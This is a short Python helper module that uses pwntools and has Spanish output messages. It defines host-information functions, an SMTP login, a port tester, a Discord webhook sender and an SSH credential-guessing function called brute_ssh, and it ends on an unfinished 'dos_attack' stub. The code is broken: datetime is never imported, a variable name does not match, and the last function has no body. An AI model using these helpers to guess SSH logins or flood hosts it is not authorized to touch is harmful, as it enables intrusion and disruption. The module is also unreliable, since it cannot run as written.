from subprocess import Popen
import platform, smtplib, requests, socket
from pwn import *

date = hora = datetime.datetime.now() 
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
smtserver = smtplib.SMTP('smtp.gmail.com', 587)
smtserver.ehlo()
smtserver.starttls()

def start_process(process):
  Popen(process)

def get_processor_name():
  print(platform.machine())

def get_processor_info():
  print(platform.processor())

def get_system():
  print(platform.system())

def get_ip():
  print(ip)

def get_hostname():
  print(hostname)

def get_date():
  print(date)

def smtp_login(email, password):
  smtserver.login(email, password)

def brute_ssh(host, user, password):
  try:
    ssh_connection = ssh(host, user, password)
    print(f'\n[-] Successful connection to {host}, {user}, {password}\n')

  except:
    print(f'\n[-] Conneciton failed to {host}, {user}, {password}\n')

def test_port(host, port):
  try:
    remote(host, port)
    print(f'\n[-] The port {port} of the IP {host} is opened\n')

  except:
    print(f'\n[-] The port {port} of the IP {host} is closed\n')

def get_status(url):
  response = requests.get(url)
  print(f'\n[-] Código de respuesta: {response.status_code}')
  print(f'[-] Informe del estado: {response.reason}\n')

def discord_send_message(webhook, message):
  try:
    requests.post(webhook, json={'username': 'Zombiegeek0', 'content': mensaje})
    print('\n[-] Mensaje enviado\n')

  except:
    print('\n[-] No se ha podido enviar el mensaje\n')

def validate_ip(ip):
  try:
    print('\n')
    socket.inet_aton(ip)
    return True

  except:
    print('\n')
    return False

def dos_attack(ip)


















